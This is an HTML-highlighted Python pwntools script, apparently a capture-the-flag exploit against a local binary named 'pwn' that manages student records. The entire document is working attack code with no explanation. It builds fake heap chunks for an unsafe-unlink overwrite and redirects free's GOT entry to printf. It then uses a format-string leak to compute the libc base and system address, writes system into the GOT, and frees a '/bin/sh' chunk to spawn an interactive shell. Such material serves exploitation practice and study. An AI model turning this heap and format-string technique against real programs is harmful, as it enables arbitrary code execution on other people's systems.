<div class="highlight"><pre><span class="c">#!/usr/bin/python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./pwn&#39;</span><span class="p">)</span>

<span class="n">system</span> <span class="o">=</span> <span class="mi">260240</span>
<span class="n">libc_start</span> <span class="o">=</span> <span class="mi">132384</span>
<span class="n">free_got</span> <span class="o">=</span> <span class="mh">0x602018</span>
<span class="n">printf</span> <span class="o">=</span> <span class="mh">0x400860</span>

<span class="n">prev_size</span> <span class="o">=</span> <span class="mi">0</span>
<span class="n">chunk1_size</span> <span class="o">=</span> <span class="mh">0x90</span>
<span class="n">chunk2_size</span> <span class="o">=</span> <span class="mh">0xa0</span>

<span class="n">point_heap</span> <span class="o">=</span> <span class="mh">0x6020e0</span> <span class="o">+</span> <span class="mi">16</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="mi">8</span> 
<span class="n">point_bk</span> <span class="o">=</span>  <span class="n">point_heap</span> <span class="o">-</span> <span class="mi">16</span>
<span class="n">point_fd_low</span> <span class="o">=</span> <span class="n">point_heap</span> <span class="o">-</span> <span class="mi">24</span>
<span class="n">point_fd_high</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">point_fd_high</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">point_bk</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x70</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">chunk1_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">chunk2_size</span><span class="p">)</span>
<span class="n">Format</span> <span class="o">=</span> <span class="s">&#39;%15$016llx&#39;</span>


<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;add 0? &#39;</span><span class="p">)</span>
<span class="c">#add student 0 		call system</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information.&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information:&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;07&#39;</span> <span class="o">+</span> <span class="s">&#39;/bin/sh&#39;</span> <span class="o">+</span> <span class="s">&#39;05aaaaa&#39;</span><span class="p">)</span>


<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;add 1? &#39;</span><span class="p">)</span>
<span class="c">#add student 1		leak</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information.&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information:&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">Format</span><span class="p">))</span> <span class="o">+</span> <span class="n">Format</span> <span class="o">+</span> <span class="s">&#39;05aaaaa&#39;</span><span class="p">)</span>


<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;add 2? &#39;</span><span class="p">)</span>
<span class="c">#add student 2</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information.&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information:&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;18&#39;</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span><span class="o">*</span><span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">chunk1_size</span> <span class="o">|</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">point_fd_low</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;125&#39;</span> <span class="o">+</span> <span class="s">&#39;b&#39;</span><span class="o">*</span><span class="mi">125</span><span class="p">)</span>


<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;add 3? &#39;</span><span class="p">)</span>
<span class="c">#add student 3</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information.&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information:&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;03&#39;</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="s">&#39;127&#39;</span> <span class="o">+</span> <span class="s">&#39;d&#39;</span><span class="o">*</span><span class="mi">127</span><span class="p">)</span>

<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;add 4? &#39;</span><span class="p">)</span>
<span class="c">#add student 4</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information.&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information:&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;10&#39;</span> <span class="o">+</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">10</span> <span class="o">+</span> <span class="s">&#39;100&#39;</span> <span class="o">+</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span>

<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;change 3? &#39;</span><span class="p">)</span>
<span class="c">#change student 3</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information.&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;change&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>


<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;delete 4? &#39;</span><span class="p">)</span>
<span class="c">#delete 4</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information.&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;d&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;number&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>

<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;change 3? &#39;</span><span class="p">)</span>
<span class="c">#change student 3, change pointer</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information.&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;change&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mi">30</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="o">-</span><span class="mi">20</span><span class="p">))</span>


<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;change 3? &#39;</span><span class="p">)</span>
<span class="c">#change student 3, change *pointer</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information.&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;change&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">printf</span><span class="p">))</span>


<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;delete 1? &#39;</span><span class="p">)</span>
<span class="c">#delete 1, leak info </span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information.&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;d&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;number&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>


<span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">data</span> <span class="o">+=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
<span class="n">libcbase</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:</span><span class="mi">17</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">libc_start</span> <span class="o">-</span> <span class="mi">240</span>
<span class="n">system</span> <span class="o">+=</span> <span class="n">libcbase</span>
<span class="k">print</span> <span class="s">&#39;libcbase: &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">libcbase</span><span class="p">)</span>
<span class="k">print</span> <span class="s">&#39;system: &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>


<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;change 3? &#39;</span><span class="p">)</span>
<span class="c">#change student 3, change *pointer</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information.&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;c&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;change&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>



<span class="nb">raw_input</span><span class="p">(</span><span class="s">&#39;delete 0? &#39;</span><span class="p">)</span>
<span class="c">#delete 1, leak info </span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;information.&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;d&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;number&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;0&#39;</span><span class="p">)</span>


<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>